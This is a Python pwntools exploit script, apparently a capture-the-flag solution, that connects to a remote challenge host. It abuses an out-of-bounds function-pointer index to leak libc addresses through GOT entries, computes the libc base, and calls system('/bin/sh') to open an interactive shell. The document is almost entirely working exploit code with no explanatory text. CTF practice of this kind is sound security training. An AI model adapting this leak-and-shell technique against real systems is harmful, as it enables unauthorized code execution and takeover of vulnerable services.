from pwn import *

HOST = "a991838dc8bc63c9331b22dd0ce03823.chal.ctf.ae"
p = remote(HOST, 443, ssl=True, sni=HOST)

context.log_level = "debug"

binary = "./chall"
libc_path = "./libc-2.40-1-x86_64.so"
libc = ELF(libc_path, checksec = False)

#p = process(binary)

puts_plt = 0x401030
main = 0x401575

conv_start = 0x404010
addr_name = 0x404080
idx = (addr_name - conv_start)//8 + 1

def INPUT(name, menu, value):
    p.sendlineafter(b"[*] NickName> ",  name)
    p.sendlineafter(b"[2] Hard\n> ", str(menu))
    p.sendlineafter(b"[*] Guess>> ", str(value))

#============= Used for get libc file ===================
# puts : 0xbe0
'''
puts_got = 0x403F60
name = p64(puts_plt)

INPUT(name, idx, puts_got)
puts_libc = u64(p.recvline()[-7:-1].ljust(8, b"\x00"))
log.info(f"puts in libc : {hex(puts_libc)}")
'''
# open : 290
'''
open_got = 0x403FC0
name = p64(puts_plt)

INPUT(name, idx, open_got)
open_libc = u64(p.recvline()[-7:-1].ljust(8, b"\x00"))
log.info(f"open in libc : {hex(open_libc)}")
'''

# exit : 940
'''
exit_got = 0x403FD0
name = p64(puts_plt)

INPUT(name, idx, exit_got)
exit_libc = u64(p.recvline()[-7:-1].ljust(8, b"\x00"))
log.info(f"exit in libc : {hex(exit_libc)}")
'''

# read : c10
read_got = 0x403F88

name = p64(puts_plt) + p64(main)
INPUT(name, idx, read_got)
read_libc = u64(p.recvline()[-7:-1].ljust(8, b"\x00"))
log.info(f"read in libc : {hex(read_libc)}")

#======================================================

# Calculate address of system, "/bin/sh"
base = read_libc - libc.symbols['read']
log.info(f"libc base : {hex(base)}")

system = base + libc.symbols['system']
log.info(f"system : {hex(system)}")

binsh = base + list(libc.search(b'/bin/sh'))[0]
log.info(f"binsh : {hex(binsh)}")

# call main
menu = idx+1    # index from conv to stored main

p.sendlineafter(b"[2] Hard\n> ", str(menu))
p.sendlineafter(b"[*] Guess>> ", str(binsh))

# system("/bin/sh")
name = p64(system) + b"/bin/sh\0"
value = addr_name + 8   # address of "/bin/sh"

INPUT(name, idx, value)

p.interactive()
